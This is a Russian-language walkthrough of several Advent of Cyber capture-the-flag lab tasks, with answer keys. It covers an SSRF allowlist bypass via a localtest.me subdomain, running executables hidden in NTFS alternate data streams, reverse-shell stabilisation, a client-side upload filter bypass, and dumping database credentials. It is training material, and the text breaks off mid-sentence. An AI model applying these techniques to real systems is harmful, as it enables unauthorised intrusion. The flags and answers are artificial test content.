Самое очевидное, что мы можем попробовать сделать в первую очередь, это получить корень того же сайта. Перейдите по 
адресу:  http://MACHINE_IP/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2F Это, кажется, имеет потенциал, так как вместо 
оригинального сообщения "Tib3rius is on the Nice List." мы видим "Not Found.  The required URL was not found on this 
server." Это похоже на общее сообщение 404, указывающее, что мы смогли заставить сервер запросить измененный URL и 
вернуть ответ. Есть много вещей, которые мы могли бы сделать сейчас, например, попытаться найти допустимые URL для 
сайта "list.hohoho". Мы также могли бы попробовать изменить номер порта с 8080 на что-то другое, чтобы посмотреть, 
сможем ли мы подключиться к любым другим службам, работающим на хосте, даже если эти службы не являются 
веб-серверами.        


Попробуйте изменить номер порта с 8080 на 80 (порт HTTP по умолчанию):  http://MACHINE_IP/?proxy=http%3A%2F%2Flist.hohoho%3A80

Сообщение теперь изменится на «Не удалось подключиться к порту 80 list.hohoho: соединение отклонено», что говорит о 
том, что порт 80 не открыт на list.hohoho. 

Попробуйте изменить номер порта на 22 (порт SSH по умолчанию):  http://MACHINE_IP/?proxy=http%3A%2F%2Flist.hohoho%3A22

Теперь сообщение изменится на "Recv failure: Connection reset by peer", что предполагает, что порт 22 открыт, но не 
понял, что было отправлено (это имеет смысл, так как отправка HTTP- запроса на сервер SSH ни к чему не приведет!)  

Перечисление открытых портов через SSRF можно выполнить таким образом, перебирая общие порты и измеряя различия 
между ответами. Даже в случаях, когда сообщения об ошибках не возвращаются, часто можно определить, какие порты 
открыты, а какие закрыты, измеряя время, необходимое для выполнения каждого запроса.  

Еще одна вещь, которую мы можем попробовать сделать с помощью SSRF, — это доступ к службам, работающим локально на 
сервере. Мы можем сделать это, заменив имя хоста list.hohoho на «localhost» или «127.0.0.1» (среди прочих). 
Попробуйте это сейчас:  http://MACHINE_IP/?proxy=http%3A%2F%2Flocalhost  

Упс! Похоже, у разработчика есть проверка для этого, так как возвращенное сообщение гласит: «Ваш поиск был 
заблокирован нашей службой безопасности». 

Действительно, если вы попробуете другие имена хостов (например, 127.0.0.1, example.com и т. д.), они все будут 
заблокированы. Разработчик реализовал проверку, чтобы гарантировать, что предоставленное имя хоста начинается с 
«list.hohoho», и будет блокировать любые имена хостов, которые не начинаются с «list.hohoho».   

Как оказалось, эту проверку можно легко обойти. Поскольку имя хоста просто должно начинаться с "list.hohoho", мы 
можем воспользоваться поддоменами DNS и создать собственный домен "list.hohoho.evilsite.com", который преобразуется 
в 127.0.0.1. Фактически, нам даже не нужно покупать домен или настраивать DNS, потому что уже существует несколько 
доменов, которые позволяют нам это сделать. Тот, который мы будем использовать, — localtest.me, который преобразует 
каждый поддомен в 127.0.0.1.    

Поэтому мы можем установить имя хоста в URL на "list.hohoho.localtest.me", обойти проверку и получить доступ к 
локальным службам:  http://MACHINE_IP/?proxy=http%3A%2F%2Flist.hohoho.localtest.me 

Успех! Похоже, что локально работает веб-сервер, и на нем есть сообщение от Elf McSkidy, содержащее некоторую 
конфиденциальную информацию, которую мы можем использовать! 

Нажмите ссылку "Администратор" вверху или прокрутите вниз до входа. Угадайте имя пользователя и используйте 
найденный вами пароль, чтобы войти как Санта. 

Удалите список непослушных детей, чтобы найти флаг вызова!
Спасибо!
Спасибо за выполнение этого задания! Надеюсь, вы узнали некоторые основы SSRF , а также некоторые приемы обхода 
ограничений домена (этот конкретный обход использовался в найденном мной баг-баунти). 

Пожалуйста, рассмотрите возможность подписаться на меня в Twitter ( @TibSec ), Twitch ( TibSec ) и YouTube ( 
Tib3rius ). Я также продаю два курса OSCP PrivEsc на Udemy; купоны на оба курса можно найти в моем Twitter. Вы также 
можете  бесплатно попробовать мои  комнаты Windows  и  Linux PrivEsc на TryHackMe!  

С Рождеством!

Тиб3риус

### Ответить на вопросы ниже
Какой пароль у Санты?
```commandline
Be good for goodness sake!
```
Что такое флаг вызова?
```commandline
THM{EVERYONE_GETS_PRESENTS}
```

## Задание 25
Кто-то озорничает в The Best Festival Company. Содержимое чулок было извлечено. В одном из чулок была оставлена 
подсказка, которая намекает, что содержимое было спрятано в Elfstation1. МакИгер быстро движется и пытается войти в 
машину через RDP . Ой! Он не может войти в систему.

К счастью, он изучил PowerShell и может удаленно подключаться к рабочей станции, используя PowerShell через SSH.

Задача : Используйте консоль PowerShell для навигации по конечной точке, чтобы найти скрытое содержимое и узнать, 
что было спрятано в чулках. 

Посмотрите видео Джона Хаммонда о решении этой задачи!

Для подключения к удаленному компьютеру вы будете использовать SSH.

Команда, которую необходимо выполнить для подключения к удаленной машине: `ssh -l mceager MACHINE_IP`



Обратите внимание, что ваш IP-адрес будет другим. При появлении запроса введите пароль: `r0ckStar!`

Если вы успешно вошли в систему, вы увидите следующее сообщение.



Прежде чем начать, запустите PowerShell и перейдите в папку «Документы».



Примечание : загрузка виртуальной машины может занять до 3 минут.

Официальное объяснение PowerShell таково: «PowerShell — это кроссплатформенная среда автоматизации задач и 
управления конфигурацией, состоящая из командной строки и языка сценариев. В отличие от большинства оболочек, 
которые принимают и возвращают текст, PowerShell построен на основе .NET Common Language Runtime (CLR) и принимает и 
возвращает объекты .NET. Это фундаментальное изменение приносит совершенно новые инструменты и методы для 
автоматизации».    

PowerShell стал более популярным за последние несколько лет среди защитников и особенно среди атакующих. Знание 
PowerShell — необходимый навык. Если вы только слышали о PowerShell , но никогда не пробовали его, не волнуйтесь, 
сегодня вы это сделаете.  

Вспомним из определения выше, что PowerShell — это командная строка. Мы должны вводить команды в командную строку, 
чтобы указать PowerShell , что мы хотим, чтобы он сделал для нас. Команды PowerShell называются командлетами. 

Чтобы вывести список содержимого текущего каталога, в котором мы находимся, мы можем использовать  Get-ChildItem 
командлет. Существуют различные другие опции, которые мы можем использовать с этим командлетом, чтобы еще больше 
расширить его возможности.  

-Path Указывает путь к одному или нескольким местоположениям. Подстановочные знаки принимаются.
-File / -Directory Чтобы получить список файлов, используйте параметр File. Чтобы получить список каталогов, 
используйте параметр Directory. Вы можете использовать параметр Recurse с параметрами File и/или Directory. 
-Filter Задает фильтр для определения параметра Path.
-Recurse Получает элементы в указанных местоположениях и во всех дочерних элементах местоположений.
-Hidden Чтобы получить только скрытые элементы, используйте параметр Hidden.
-ErrorAction SilentlyContinue Указывает, какое действие следует предпринять, если команда обнаружит ошибку.
Например, если вы хотите просмотреть все скрытые файлы в текущем каталоге, вы можете выполнить следующую команду: 
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue 

Еще один полезный командлет —  Get-Content. Он позволит вам прочитать содержимое файла.

Эту команду можно выполнить следующим образом: Get-Content -Path file.txt

Вы можете выполнить множество операций с помощью  Get-Content командлета, чтобы получить больше информации о 
конкретном файле, который вы проверяете. Например, сколько слов в файле и точные позиции для определенной строки в файле. 

Чтобы получить количество слов, содержащихся в файле, вы можете использовать  Get-Content командлет и  передать  
результаты в  Measure-Object командлет. 

Эту команду можно выполнить следующим образом: Get-Content -Path file.txt | Measure-Object -Word

Чтобы получить точное положение строки в файле, вы можете использовать следующую команду:  `(Get-Content -Path file.txt)[index]`

Индекс — это числовое значение, которое является местоположением строки в файле. Поскольку индексы начинаются с нуля,
обычно необходимо вычесть единицу из исходного значения, чтобы извлечь строку в правильной позиции.  Это не 
обязательно для этого упражнения .  

Для смены каталогов можно использовать  Set-Location командлет.

Например,  Set-Location -Path c:\users\administrator\desktop  измените свое местоположение на рабочий стол 
администратора. 

Последний командлет, который нужен для решения этой комнаты, — это  Select-String. Этот командлет будет искать в 
определенном файле шаблон, который вы определяете в команде для запуска. 

Пример выполнения этой команды: `Select-String -Path 'c:\users\administrator\desktop' -Pattern '*.pdf'`

Примечание : Вы всегда можете использовать  Get-Help командлет, чтобы получить больше информации о конкретном 
командлете. Например, Get-Help Select-String 

### Ответить на вопросы ниже
Найдите первый скрытый файл elf в папке Documents. Прочитайте содержимое этого файла. Чего хочет Elf 1?
```commandline
2 front teeth
```
Найдите на рабочем столе скрытую папку, содержащую файл Elf 2. Прочитайте содержимое этого файла. Как называется тот 
фильм, который хочет Elf 2? 
```commandline
Scrooged
```
Найдите в каталоге Windows скрытую папку, содержащую файлы для Elf 3. Каково имя скрытой папки? (Эта команда займет 
некоторое время) 
```commandline
3lfthr3e
```
Сколько слов содержится в первом файле?
```commandline
9999
```
Какие два слова находятся под индексами 551 и 6991 в первом файле?
```commandline
Red Ryder
```
Это только половина ответа. Найдите во 2-м файле фразу из предыдущего вопроса, чтобы получить полный ответ. Чего 
хочет Эльф 3? (используйте пробелы при отправке ответа) 
```commandline
Red Ryder BB Gun
```
## Задание 26
Один из «маленьких помощников» вошел в свою рабочую станцию и обнаружил, что файл коннектора базы данных был заменен,
и он больше не может найти этот нехороший список. Более того, при запуске файла коннектора базы данных было показано 
насмешливое сообщение, намекающее на то, что файл был перемещен в другое место.  

МакИгер был уведомлен, и он соберет все части воедино, чтобы найти файл коннектора базы данных.

Посмотрите видео DarkStar о решении этой задачи здесь .

Задача : найти, где спрятан файл коннектора базы данных, используя методы расследования, аналогичные криминалистическим.

Вы можете использовать  AttackBox  и  Remmina  для подключения к удаленной машине. Убедитесь, что удаленная машина 
развернута, прежде чем продолжить. 

Нажмите на значок плюса, как показано ниже.



Для  сервера  укажите ( MACHINE_IP) как IP-адрес, предоставленный вам для удаленной машины. Учетные данные для 
учетной записи пользователя: 

Имя пользователя: littlehelper
Пользовательский пароль: iLove5now!


Примите сертификат при появлении соответствующего запроса, и вы теперь будете входить в удаленную систему.

Примечание : загрузка виртуальной машины может занять до 3 минут.

Продолжим наше путешествие с Powershell. С помощью Powershell мы можем получить хэши файлов на конечной точке.

Хэш файла, или просто хэш, — это математический алгоритм, который анализирует данные файла и выводит значение, 
которое является его хешем. Хэши файлов позволяют нам узнать, является ли файл легитимным или нет, на основе его 
проверенного хеша файла. Если файл был заменен или изменен, хэш файла будет другим. Из этого правила есть исключения,
но мы не будем в них углубляться. На данный момент можно с уверенностью сказать, что хэш файла действует как подпись 
для файла.    

С помощью PowerShell мы можем получить хэш файла, выполнив следующую команду: `Get-FileHash -Algorithm MD5 file.txt`

Сравнив проверенный хэш файла с выводом приведенного выше командлета, вы узнаете, является ли файл подлинным.

На этом этапе вы должны быть уверены, что файл, находящийся в папке Documents, не является легитимным. Если вы 
запустите файл, вы увидите, что он не содержит много информации, только намек на то, что исходный файл был перемещен 
в другое место в конечной точке.  

Другой инструмент, который вы можете использовать для проверки внутри двоичного файла (.exe), — это  Strings.exe. 
Strings сканирует файл, который вы ему передаете, на наличие строк длиной по умолчанию 3 или более символов. Вы 
можете использовать инструмент Strings, чтобы заглянуть внутрь этого загадочного исполняемого файла. Инструмент 
находится внутри  C:\Tools.   

Команда, которую необходимо запустить для инструмента Strings для сканирования загадочного исполняемого файла: 
`c:\Tools\strings64.exe -accepteula file.exe` 

В выводе вы должны заметить команду, связанную с ADS. Вы знаете это по концу команды Powershell  -Stream.

Альтернативные потоки данных  (ADS) — это атрибут файла, специфичный для Windows  NTFS  (New Technology File System).
Каждый файл имеет по крайней мере один поток данных ($DATA), а ADS позволяет файлам содержать более одного потока 
данных. Изначально проводник Windows не отображает ADS для пользователя. Существуют сторонние исполняемые файлы, 
которые можно использовать для просмотра этих данных, но Powershell дает вам возможность просматривать ADS для файлов.   

Авторы вредоносных программ использовали ADS для сокрытия данных в конечной точке, но не все ее применения 
вредоносны. Когда вы загружаете файл из Интернета в конечную точку, в ADS записываются идентификаторы, указывающие, 
что файл был загружен из Интернета.  

Команда для просмотра ADS с помощью Powershell: Get-Item -Path file.exe -Stream *

При запуске этой команды выводится несколько строк. Обратите особое внимание на  Stream  и  Length.

Вспомним, что файл коннектора базы данных — это исполняемый файл, и он скрыт в альтернативном потоке данных для 
другого файла. Мы можем использовать встроенный инструмент Windows,  Windows Management Instrumentation , для запуска скрытого файла. 

Команда, которую необходимо выполнить для запуска скрытого исполняемого файла, скрывающегося внутри ADS: wmic 
process call create $(Resolve-Path file.exe:streamname) 

Примечание : необходимо заменить  file.exe  фактическим именем файла, содержащего ADS, а  streamname  — фактическим 
именем потока, отображаемого в выходных данных. 

### Ответить на вопросы ниже
Прочитайте содержимое текстового файла в папке Documents. Какой хэш файла для db.exe?
```commandline
596690FFC54AB6101932856E6A78E3A1
```
Каков хэш файла загадочного исполняемого файла в папке «Документы»?
```commandline
5F037501FB542AD2D9B06EB12AED09F0
```
Используя строки, найти скрытый флаг внутри исполняемого файла?
```commandline
THM{f6187e6cbeb1214139ef313e108cb6f9}
```
Какой флаг отображается при запуске файла коннектора базы данных?
```commandline
THM{3088731ddc7b9fdeccaed982b07c297c}
```

## Задание 27
В последние несколько дней в Best Festival Company происходят странные вещи. У МакИгера не было времени полностью 
исследовать скомпрометированные конечные точки со всем, что происходит, и у него нет времени на пересоздание образов 
рабочих станций. МакИгер решает войти в другую рабочую станцию, одну из своих резервных систем.  

МакИгер входит в систему и к своему разочарованию не может войти в свой менеджер паролей. Он не принимает его 
главный ключ! Он замечает, что имя папки было переименовано во что-то странное. 

Задача: Вам необходимо получить доступ к менеджеру паролей и расшифровать значения в менеджере паролей с помощью 
CyberChef. 

Посмотрите, как Джон Хаммонд решает эту задачу!

Вы можете использовать AttackBox и Remmina для подключения к удаленной машине. Убедитесь, что удаленная машина 
развернута, прежде чем продолжить. 

Нажмите на значок плюса, как показано ниже.

Для сервера укажите (MACHINE_IP) как IP-адрес, предоставленный вам для удаленной машины. Учетные данные для 
учетной записи пользователя: 

Имя пользователя: Administrator
Пользовательский пароль: sn0wF!akes!!!

Примите сертификат при появлении соответствующего запроса, и вы теперь будете входить в удаленную систему.

Примечание: загрузка виртуальной машины может занять до 3 минут.

Менеджеры паролей в наши дни стали нормой. Существует множество облачных менеджеров паролей, но есть также менеджеры 
паролей, которые вы запускаете локально на своей конечной точке, например KeePass. KeePass — это исполняемый файл, 
который позволяет вам хранить все типы данных, включая пароли, в защищенной паролем базе данных. Официальное 
определение KeePass с его веб-сайта:   

" Сегодня вам нужно помнить много паролей. Вам нужен пароль для множества веб-сайтов, вашей учетной записи 
электронной почты, вашего веб-сервера, сетевых логинов и т. д. Список бесконечен. Кроме того, вам следует 
использовать разные пароли для каждой учетной записи, потому что если вы будете использовать только один пароль 
везде и кто-то получит этот пароль, у вас возникнет проблема: вор получит доступ ко всем вашим учетным записям. 
KeePass — это бесплатный менеджер паролей с открытым исходным кодом, который поможет вам безопасно управлять вашими 
паролями. Вы можете хранить все ваши пароли в одной базе данных, которая заблокирована с помощью главного ключа. 
Таким образом, вам нужно запомнить только один главный ключ, чтобы разблокировать всю базу данных. "      

Теперь, когда это сделано, откройте папку со странным именем на рабочем столе и запустите KeePass. Вам будет 
предложено ввести главный пароль. Если вы введете фразу  mceagerrockstar,  вы увидите сообщение о том, что ключ 
недействителен.  

Если взглянуть на имя папки, оно выглядит загадочным, как некая кодировка. Шифрование и кодировка — это известные 
методы, используемые в ИТ, особенно в сфере компьютерной безопасности. Разработчики вредоносных программ используют 
некоторые из этих методов кодировки, чтобы скрыть свой вредоносный код. Некоторые кодировки можно быстро 
идентифицировать, а некоторые — нет.   

Вы можете использовать  CyberChef  для расшифровки/декодирования зашифрованных/кодированных значений, которые вы 
встретите в этой конечной точке. CyberChef — это самопровозглашенный «швейцарский армейский нож» от GCHQ. Это 
фантастический инструмент для преобразования, извлечения и манипуляции данными в вашем веб-браузере. CyberChef 
использует рецепты для выполнения этой магии.   

Говоря о «магии», вы можете использовать  рецепт для расшифровки имени папки. На конечной точке Magic есть локальная 
копия CyberChef ( ).C:\Tools 

Чтобы использовать рецепт, просто перетащите его в  окно Рецепт  .  Auto Bake должен быть отмечен, что автоматически 
запустит рецепт с закодированным значением. Если он не отмечен, просто нажмите BAKE! 

Теперь, когда вы разблокировали KeePass, вы должны увидеть, что в файле базы данных KeePass есть больше кодировок. 
Внимательно просмотрите заметки  для  каждой записи. Они дадут подсказки о том, как их расшифровать. Некоторые 
популярные кодировки перечислены в разделе  Избранное . (ПОДСКАЗКА)  

Примечание: Чтобы просмотреть  записи паролей  , нажмите на  ellipsis [ ... ].

Авторы вредоносного ПО выполняют различные итерации кодирования, чтобы помешать процессу обратного проектирования. 
При этом одно из закодированных значений потребует от вас запустить дубликат рецепта 2x, чтобы получить полностью 
декодированное значение. (ПОДСКАЗКА)  

### Ответить на вопросы ниже
Какой пароль к базе данных KeePass?
```commandline
thegrinchwashere
```
Какой метод кодирования указан как «Операции сопоставления»?
```commandline
Base64
```
Каково расшифрованное значение пароля сервера Elf?
```commandline
sn0wM4n!
```
Каково расшифрованное значение пароля для ElfMail?
```commandline
ic3Skating!
```
Нажмите и перейдите к 23 дню!
```commandline
Ответ не нужен
```

## Задание 28
Беспорядок в Best Festival Company продолжается. МакИгер получает многочисленные электронные письма и телефонные 
звонки о возможной атаке с использованием вируса-вымогателя, затрагивающей все конечные точки в сети. МакИгер знает, 
что конечные точки, зараженные вредоносным ПО, не имеют резервных копий, но, к счастью, на его рабочей станции 
резервное копирование включено.   

Задача : Исследовать вредоносное ПО и восстановить файлы в исходное состояние.

Посмотрите видео DarkStars по решению этой задачи!

Вы можете использовать  AttackBox  и  Remmina  для подключения к удаленному компьютеру через RDP (протокол 
удаленного рабочего стола). 

Чтобы в полной мере ощутить имитацию атаки вируса-вымогателя, необходимо настроить некоторые параметры в Remmina для 
просмотра обоев на удаленном компьютере. 

Запустите Remmina. Когда приложение загрузится, нажмите на многоточие, чтобы получить доступ к параметрам настроек.

В раскрывающемся списке нажмите «Настройки».

Нажмите на RDP в окне настроек.

Внесите следующие изменения и нажмите «ОК».

Теперь с этим набором вы готовы подключиться к удаленной машине. Убедитесь, что он развернут, прежде чем продолжить. Щелкните значок плюса, как показано ниже.

Для  сервера  укажите ( MACHINE_IP) как IP-адрес, предоставленный вам для удаленной машины. Учетные данные для учетной записи пользователя:

Имя пользователя: administrator
Пользовательский пароль: sn0wF!akes!!!


Примите сертификат при появлении соответствующего запроса, и вы теперь будете входить в удаленную систему.

Примечание : загрузка виртуальной машины может занять до 3 минут.

Программы-вымогатели — это реальная угроза, от которой должны защищаться и готовиться как корпоративные защитники, 
так и обычные пользователи компьютеров. Согласно Википедии, программы-вымогатели — это тип вредоносного ПО, которое 
угрожает опубликовать данные жертвы или навсегда заблокировать доступ к ним, если не будет заплачен выкуп. Может 
быть пугающим опытом войти в машину и понять, что вредоносное ПО зашифровало все ваши важные документы.   

Существует множество продуктов безопасности, которые можно внедрить в стек безопасности для обнаружения этого типа 
вредоносного ПО. Если программа-вымогатель заражает конечную точку, в зависимости от фактического вредоносного ПО 
может быть дешифратор, предоставленный поставщиком безопасности. Если нет, то вам придется полагаться на резервные 
копии, чтобы восстановить свои машины до последнего рабочего состояния вместе с их файлами. В Windows есть 
встроенная функция, которая может помочь в этом.    

Служба  теневого копирования томов  (VSS) координирует действия, необходимые для создания согласованной теневой 
копии (также известной как моментальный снимок или копия на определенный момент времени) данных, подлежащих 
резервному копированию. ( официальное определение )  

Авторы вредоносных программ знают об этой функции Windows и пишут код в своих вредоносных программах для поиска этих 
файлов и их удаления. Это делает невозможным восстановление после атаки программы-вымогателя, если у вас нет 
резервной копии в автономном режиме/вне офиса. Однако не все вредоносные программы удаляют теневые копии томов.  

Прежде чем углубляться в VSS на конечной точке, давайте кратко поговорим о планировщике задач.

Планировщик  задач  позволяет автоматически выполнять рутинные задачи на выбранном компьютере. Планировщик задач 
делает это, отслеживая любые выбранные вами критерии (называемые триггерами), а затем выполняя задачи, когда эти 
критерии выполняются. ( официальное определение )  

Авторы вредоносных программ могут заставить вредоносную программу создать запланированную задачу, чтобы вредоносная 
программа запускалась в определенный день/время или при определенном триггере. Утилита Task Scheduler удобно 
размещена на панели задач для вас. Чтобы просмотреть запланированные задачи, щелкните  Task Scheduler Library . Вы 
должны увидеть 2 запланированные задачи, представляющие интерес: одну со странным именем и другую, связанную с VSS. 
Щелкните любую из запланированных задач, чтобы получить дополнительную информацию о ней, например  Triggers  и  
Actions .     

На этом этапе вы должны понять, что VSS включен, и благодаря запланированной задаче вы знаете идентификатор тома.

Команда для взаимодействия с VSS —  vssadmin. Запуск только этой команды отобразит краткую информацию о том, как 
запустить утилиту с дополнительными командами. Две команды, представляющие особый интерес, — это  List Volumes и  
List Shadows.  



Если вы запустите,  vssadmin list volumes то увидите, что диск C:\ имеет другое имя/идентификатор тома. На конечной 
точке должен быть другой том. 



Вы можете использовать Disk Management, чтобы проверить это.  Disk Management  — это системная утилита в Windows, 
которая позволяет вам выполнять расширенные задачи хранения. ( официальное определение ) Как и другие утилиты, Disk 
Management был помещен на панель задач для вашего удобства.  

Как вы видите, есть еще один том, но вы не можете просмотреть его в проводнике Windows. Щелкните правой кнопкой мыши 
раздел, чтобы просмотреть его свойства. Теперь посмотрите на вкладку  Security . Убедитесь, что имя/идентификатор 
тома из выходных данных планировщика заданий и vssadmin аналогичны этому  object name разделу. Также обратите 
внимание, что есть вкладка с названием  Shadow Copies. Просмотрите информацию и закройте окно свойств.    

Чтобы увидеть этот раздел в проводнике Windows, необходимо назначить ему букву диска. Щелкните правой кнопкой мыши 
раздел и выберите  Change Drive Letter and Paths. Нажмите  Add. В раскрывающемся списке выберите букву, например Z, 
и нажмите OK. В верхней части, в столбце Volume, вы должны увидеть, что разделу назначена буква. Откройте проводник 
Windows, чтобы перейти к разделу.   

В предыдущем испытании вам удалось просмотреть скрытый контент в папках через командную строку. Вы можете сделать то 
же самое в проводнике Windows. В меню выберите  Viewи отметьте   Hidden Items. Теперь вы должны увидеть любой 
скрытый контент прямо в проводнике Windows.  

Возвращаясь к VSS, чтобы восстановить файлы до предыдущей версии, просто щелкните правой кнопкой мыши папку и 
выберите,  Properties затем выберите  Previous Versions вкладку. Выберите, какую теневую копию вы хотите 
восстановить, и нажмите кнопку  Restore. Примите подтверждение, чтобы восстановить теневую копию. Закройте окно 
«Свойства» и перейдите в папку, чтобы найти файл(ы) восстановления.   

### Ответить на вопросы ниже
Расшифруйте поддельный «адрес биткоина» в записке с требованием выкупа. Каково значение открытого текста?
```commandline
nomorebestfestivalcompany
```
Иногда программы-вымогатели меняют расширения файлов зашифрованных файлов. Какое расширение файла у каждого из 
зашифрованных файлов? 
```commandline
.grinch
```
Как называется подозрительная запланированная задача?
```commandline
opidsfsdf
```
Проверьте свойства запланированной задачи. Где находится исполняемый файл, который запускается при входе в систему?
```commandline
C:\users\administrator\desktop\opidsfsdf.exe
```
Есть еще одна запланированная задача, связанная с VSS. Что такое ShadowCopyVolume ID?
```commandline
7a9eea15-0000-0000-0000-010000000000
```
Назначьте скрытому разделу букву. Как называется скрытая папка?
```commandline
Confidential
```
Щелкните правой кнопкой мыши и проверьте свойства скрытой папки. Используйте вкладку «Предыдущие версии», чтобы 
восстановить зашифрованный файл, который находится в этой скрытой папке, до предыдущей версии. Какой пароль в файле? 
```commandline
m33pa55w0rdIZseecure!
```

## Задание 29
Это была ночь перед Рождеством, и The Best Festival Company наконец-то могла отдохнуть. Все игрушки были сделаны, и 
компания оправилась от атаки за атакой. Теперь все было в руках Санты, и эльфам оставалось лишь пожелать ему 
счастливого пути. Эльф МакИгер сидел за своим терминалом, рассеянно глядя на начавший падать легкий снег. Как раз 
когда он задремал, Эльф МакИгер был встревожен, когда на краю его поля зрения появилась небольшая посылка.    

Подарок был завернут в темно-синий бархат, который, казалось, мерцал в свете костра, как мигающая подсказка 
терминала. Осторожно, Эльф МакИгер потянулся к лазурной ленте, медленно развязывая ее, чтобы не повредить. Бархат 
медленно сполз, открывая небольшой компьютер NUC с письмом наверху. Развернув письмо, Эльф МакИгер прочитал его 
вслух:   

«Эльф МакИгер — ваши безграничные усилия по спасению Рождества в этом году не остались незамеченными. Я хотел бы 
наградить вас особым подарком, однако есть одна загвоздка. Эльф МакСкиди и я увидели, как выросли ваши навыки, и мы 
считаем, что будет уместно вручить вам подарок после одного последнего испытания. Внутри этого пакета вы также 
найдете компьютер. Подключите его к сети и взломайте его. Удачи и счастливого Рождества — Санта»   

Не мешкая, Эльф МакИгер подключил NUC соответствующим образом и наблюдал, как он зажужжал, пробуждаясь к жизни. 
Маленький экран рядом с кнопкой питания мигнул, а затем отобразил IP-адрес, назначенный устройству. Рядом с IP 
появился небольшой символ. МакИгер тихо задавался вопросом, что это может значить, когда он вошел в свой терминал, 
готовый начать свое последнее испытание.    


Хотите пройти дальше, не чувствуя себя слишком уж сложным? Посмотрите видео одного из создателей, Darkstar, о 
решении сегодняшней задачи.  



Сегодняшнее задание — накопление навыков, которые вы приобрели в Advent of Cyber 2. Ниже также представлено досье по 
различным темам, которое поможет вам в вашем путешествии. Не бойтесь просить о помощи в Discord- канале, где это 
необходимо, просто обязательно постарайтесь сделать все возможное! advent-of-cyber-2  

Фильтры на стороне клиента:

Еще в День 2 мы рассматривали, как обойти фильтр на стороне сервера вокруг функции загрузки файлов. Теперь пришло 
время увидеть, как обойти фильтр на стороне клиента. 

Во многих отношениях фильтры на стороне клиента легче обойти, чем их эквиваленты на стороне сервера, поскольку они 
выполняются на вашем собственном атакующем компьютере, что ставит их под контроль злоумышленника. По этой причине 
фильтры на стороне клиента никогда не следует использовать в качестве единственной меры безопасности для функции 
загрузки файлов на веб-сайте.   

Итак, как обойти клиентский фильтр? Самый простой способ — использовать BurpSuite для перехвата файла кода 
JavaScript, содержащего фильтр, до того, как он действительно достигнет нашего браузера, а затем либо полностью 
удалить файл, либо удалить фильтр из кода.  

Открывая новый проект BurpSuite, первое, что нам нужно сделать, это перейти на вкладку «Прокси», а затем в подраздел 
«Параметры»: 

По умолчанию BurpSuite не перехватывает файлы JavaScript при проксировании трафика, поэтому нам нужно включить эту 
функцию, прежде чем мы сможем начать удалять любые фильтры на стороне клиента. Для этого переходим в раздел 
«Перехват клиентских запросов», нажимаем на верхнюю строку (выделенную ниже), затем нажимаем «Изменить»:  

Это даст нам возможность редактировать условие. Найдите и удалите |^js$в условии, затем сохраните фильтр:

Далее перейдите в раздел «Перехват ответов сервера» и установите флажок «Перехватывать ответы на основе следующих 
правил»: 

Теперь будут перехватываться все ответы сервера, включая файлы JavaScript!

Теперь вы можете перезагрузить страницу загрузки, нажав Ctrl + F5 (обратите внимание, что это должно быть сделано с 
жестким обновлением, чтобы предотвратить 304 Not Modifiedответы), проксируя через BurpSuite. Следите за ответами по 
мере их поступления — если один из них вызван filter.js , вероятно, было бы хорошей идеей отбросить его!   

Если вы используете Mac, эквивалентная последовательность для принудительного обновления — «Настройки» -> «Очистить 
историю», затем «Control» + «R». 

Более подробную информацию по этой теме можно найти в разделе «Уязвимости загрузки» !


Модернизация и стабилизация Shell :

Вы будете знакомы с обратными оболочками из предыдущих заданий или комнат; однако оболочки, которым вас научили до 
сих пор, имели несколько фатальных недостатков. Например, нажатие Ctrl + Cполностью убивало оболочку. Вы не могли 
использовать клавиши со стрелками, чтобы просмотреть историю оболочек, а автозаполнение TAB не работало. 
Стабилизация оболочек — важный навык для изучения, поскольку он устраняет все эти проблемы, обеспечивая гораздо 
более приятную рабочую среду.    

Работаем внутри обратной оболочки:

Первое, что нужно сделать, это использовать `python3 -c 'import pty;pty.spawn("/bin/bash")'`, который использует 
Python для создания лучшей оболочки bash. На этом этапе наша оболочка будет выглядеть немного красивее, но мы все 
еще не сможем использовать автозаполнение Tab или клавиши со стрелками, а Ctrl + C все еще будет убивать оболочку.  
Шаг второй: export TERM=xterm– это даст нам доступ к таким командам, как clear.
Наконец (и самое важное) мы переведем оболочку в фоновый режим с помощью Ctrl + Z. Возвращаясь в наш собственный 
терминал, мы используем stty raw -echo; fg. Это делает две вещи: во-первых, отключает наше собственное эхо терминала 
(что дает нам доступ к автодополнениям табуляции, клавишам со стрелками и Ctrl + Cзавершению процессов). Затем он 
переводит оболочку в фон, тем самым завершая процесс.   
Полную методику можно увидеть здесь:



Обратите внимание, что если оболочка умирает, любой ввод в вашем собственном терминале не будет виден (в результате 
отключения эха терминала). Чтобы исправить это, введите reset и нажмите ввод.

Более подробную информацию по этой теме смотрите в разделе «Введение в ракушки» !


### Ваш новый лучший друг — клиент MySQL :

Базы данных используются практически каждым веб-приложением на планете в той или иной степени. По этой причине важно 
знать, как получить к ним доступ вручную. Одним из наиболее распространенных доступных серверов баз данных является 
MySQL (или его бесплатная версия: MariaDB, которая использует идентичный синтаксис и к которой осуществляется доступ 
точно таким же образом). К нему можно получить доступ вручную с помощью клиента mysql. Однако есть одна загвоздка: 
выставлять базу данных на всеобщее обозрение — очень плохая идея, поэтому, хотя и можно подключиться к базе данных 
удаленно с вашей атакующей машины с помощью клиента MySQL, мы сосредоточимся на подключении к базе данных, 
работающей локально.      

Чтобы получить доступ к базе данных с помощью клиента MySQL, мы должны использовать следующий синтаксис:
`mysql -u USERNAME -p`
Это сообщает клиенту о необходимости подключения к локальной базе данных, используя имя пользователя USERNAME( 
обратите внимание на отсутствие пробела между переключателем -uи значением! ), используя пароль, который он попросит 
нас ввести при запуске команды.  

После ввода пароля мы увидим приглашение, которое выглядит примерно так:

Обратите внимание, что оно будет выглядеть немного по-разному в зависимости от того, является ли это сервером MySQL 
или сервером MariaDB. 

Следующее, что нам следует сделать, это использовать show databases;команду для просмотра доступных баз данных:

На этом снимке экрана три верхние базы данных являются базами данных по умолчанию для установки MySQL/MariaDB. Все 
остальные — нет. 

Давайте взглянем на top_secretбазу данных.
Для входа в базу данных мы используем use DATABASE;команду, где DATABASE— имя целевой БД. Затем мы можем показать 
все таблицы в базе данных с помощью show tables;: 

На этом снимке экрана есть только одна таблица: users.

Давайте выгрузим таблицу users. Для этого используем команду SQL : SELECT * FROM users;. Теперь у нас есть имя 
пользователя и пароль, которые мы можем взломать! 

Взлом паролей онлайн :
В современную эпоху взлома паролей слабые пароли часто можно взломать без всякого взлома! Сейчас существует 
